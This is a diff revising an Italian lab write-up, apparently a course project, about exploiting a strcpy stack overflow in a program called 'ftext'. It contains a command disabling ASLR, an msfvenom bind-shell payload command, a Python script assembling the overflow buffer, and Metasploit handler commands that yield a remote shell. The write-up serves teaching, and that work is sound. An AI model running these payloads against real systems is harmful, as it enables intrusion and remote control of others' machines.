@@ -88,8 +88,8 @@ echo 0 > /proc/sys/kernel/randomize_va_space
 ```
 
 La disattivazione di ASLR è necessaria, specialmente in architetture a 64 bit, per
-rendere deterministico il posizionamento dello spazio di indirizzi di un processo,
-indispensabile per l'esecuzione dell'exploit.
+rendere deterministico (o quasi) il posizionamento dello spazio di indirizzi di un processo,
+indispensabile per l'esecuzione del payload.
 
 ## L'exploit
 Nello sviluppo dell'exploit sono stati utilizzati diversi strumenti, come gdb e metasploit.
@@ -115,7 +115,7 @@ leave
 ret
 ```
 
-Come mostrato in figura, il primo argomento della funzione strcpy (rdi) corrisponde
+Come mostrato nel codice, il primo argomento della funzione strcpy (rdi) corrisponde
 all'indirizzo base del buffer di interesse.
 Il contenuto del registro rdi è stato calcolato sottraendo al base pointer (rbp) il
 valore esadecimale 120, che in decimale corrisponde a 288. Quest'ultimo valore rappresenta
@@ -129,17 +129,16 @@ l'ausilio del framework Metasploit. Il seguente comando shell produce un payload
 una lunghezza di 119 bytes e compatibile con il sistema operativo ed architettura del
 sistema target. Una volta eseguito, il payload esegue i seguenti passaggi:\
 
-1. Crea un socket TCP in ascolto sulla porta 4444 e attende una connessione
-2. Mappa 4096 bytes nella memoria del processo
-3. Attende la ricezione di dati e li salva all'interno della memoria mappata
-4. Esegue i dati salvati
+1. Crea un socket TCP in ascolto sulla porta 4444 e attende una connessione.
+2. Mappa 4096 bytes nella memoria del processo.
+3. Attende la ricezione dei dati e li salva all'interno della memoria allocata.
+4. Esegue i dati salvati.
 
 ```sh
 msfvenom --platform linux \
          --arch x64 \
          --bad-chars '\x00' \
          --payload linux/x64/shell/bind_tcp \
-         --format python
 ```
 
 L'opzione --bad-chars '\\x00' istruisce msfvenom di non utilizzare il null byte
@@ -149,10 +148,10 @@ terminate dal carattere nullo, la presenza di un null byte all'interno del paylo
 farebbe terminare anticipatamente la copia. Di conseguenza, solo una parte del payload
 verrebbe copiata nel buffer, compromettendone il corretto funzionamento.\
 
-Dopo aver creato il payload, resta da calcolare la lunghezza del nop sled, padding e il nuovo
-indirizzo di ritorno. 60 bytes di nop sled sono stati utilizzati, lasciando quindi 117 bytes
-di padding. Infine, per calcolare il nuovo indirizzo di ritorno, l'analisi della
-porzione di memoria dello stack successivamente alla chiamata della funzione strcpy
+Dopo aver creato il payload, resta da calcolare la lunghezza del *nop sled*, *padding* e
+*return address*. 60 bytes di *nop sled* sono stati utilizzati, lasciando quindi 117 bytes
+(296 - 119 - 60) di *padding*. Infine, per calcolare il nuovo *return address*, l'analisi della
+porzione di memoria dello stack, allo stato successivo alla chiamata della funzione strcpy,
 è stata effettuata.
 
 ```sh
@@ -172,27 +171,25 @@ porzione di memoria dello stack successivamente alla chiamata della funzione str
 ...
 ```
 
-Dalla porzione di memoria mostrata risulta che l'indirizzo 0x7fffffffe826 costituisce
+Dalla porzione di memoria mostrata risulta che l'indirizzo __0x7fffffffe826__ costituisce
 un valido candidato per sovrascrivere l'indirizzo di ritorno salvato nello stack.
-Uno script in Python è stato realizzato per mettere insieme i componenti dello shellcode.
+Dopo aver realizzato gli elementi costituenti lo shellcode, un meccanismo per unire opportunamente
+questi si è necessario. A tal proposito, uno programma Python è stato realizzato.
+
 
 ```python
-import sys, subprocess as sp
-from struct import pack
+import sys, struct, subprocess as sp
 
 cp = sp.run(
     "msfvenom --platform linux --arch x64 --bad-chars '\\x00' " +
     "--payload linux/x64/shell/bind_tcp --format hex",
     stdout=sp.PIPE, stderr=sp.PIPE, shell=True, check=True
 )
-buf = bytes.fromhex(cp.stdout.decode())
 
-distance_to_ra = 296
-nopsled = b"\x90" * 60
-padding_length = distance_to_ra - len(nopsled) - len(buf)
-padding = b"A" * padding_length
-address = pack("<Q", 0x7fffffffe826)
-sys.stdout.buffer.write(nopsled + buf + padding + address)
+payload = bytes.fromhex(cp.stdout.decode())
+nopsled, padding = (b"\x90" * 60, b"A" * 117)
+address = struct.pack("<Q", 0x7fffffffe826)
+sys.stdout.buffer.write(nopsled + payload + padding + address)
 ```
 
 ## Esecuzione dell'exploit
@@ -202,21 +199,22 @@ L'attacco è strutturato in 2 fasi.
 
 ### Fase 1
 
-In questa fase, il programma vulnerabile viene eseguito fornendo in input lo shellcode
-generato in precedenza. Sulla VM predisposta viene quindi eseguito il seguente comando.
+Il programma vulnerabile viene eseguito fornendo in input lo shellcode generato in precedenza.
+Sulla VM predisposta viene quindi eseguito il seguente comando shell.
 
 ```sh
 shellcode.py | ftext
 ```
 
-Quando eseguito con successo, il comando esposto provocherà l'esecuzione del payload
-e la predisposizione della fase 2.
+Quando eseguito con successo, il comando precedente permette l'esecuzione del payload
+e quindi alla predisposizione della seconda fase.
 
 ### Fase 2
 
-In quest'ultima fase, msfconsole, uno strumento del framework Metasploit, è stato
-utilizzato per connetterci al socket TCP aperto nella fase 1 e l'esecuzione del secondo
-payload, un codice di 38 bytes che ci permette di ottenere una shell sulla virtual machine.
+In quest'ultima fase, msfconsole (uno strumento del framework Metasploit) è stato utilizzato.
+Per avviare una connessione con il socket TCP del sistema terget (aperto nella prima fase)
+e quindi eseguire il codice per ottenere la shell, i seguenti comandi sono stati eseguiti sulla console
+di Metasploit.
 
 ```sh
 msf > use exploit/multi/handler
@@ -230,10 +228,10 @@ LPORT => 4444
 msf exploit(multi/handler) > run
 ```
 
-Dopo l'esecuzione del comando run, msfconsole ci notifica con un messaggio dell'avvenuta
-esecuzione di una shell remota, comunicante attraverso una connessione TCP tra
-l'indirizzo del sistema target 192.168.122.21 e l'interfaccia di rete della macchina
-ospitante la VM con indirizzo 192.168.122.1.
+Dopo l'esecuzione del comando run, msfconsole (dopo essersi connesso con successo) ci notifica
+dell'avvenuta esecuzione di una shell, comunicante attraverso una connessione TCP tra l'indirizzo
+del sistema target (192.168.122.21) e l'interfaccia di rete della macchina ospitante la VM
+(192.168.122.1), ovvero la macchina dell'attaccante.
 
 ```sh
 [*] Started bind TCP handler against 192.168.122.21:4444
@@ -242,4 +240,4 @@ ospitante la VM con indirizzo 192.168.122.1.
 ```
 
 A questo punto è possibile eseguire comandi arbitrari sul sistema target da una connessione
-remota, con i medesimi permessi del programma vulnerabile, realizzando quindi le richieste del progetto.
+remota, con gli stessi privilegi del programma vulnerabile, realizzando quindi le richieste progettuali.
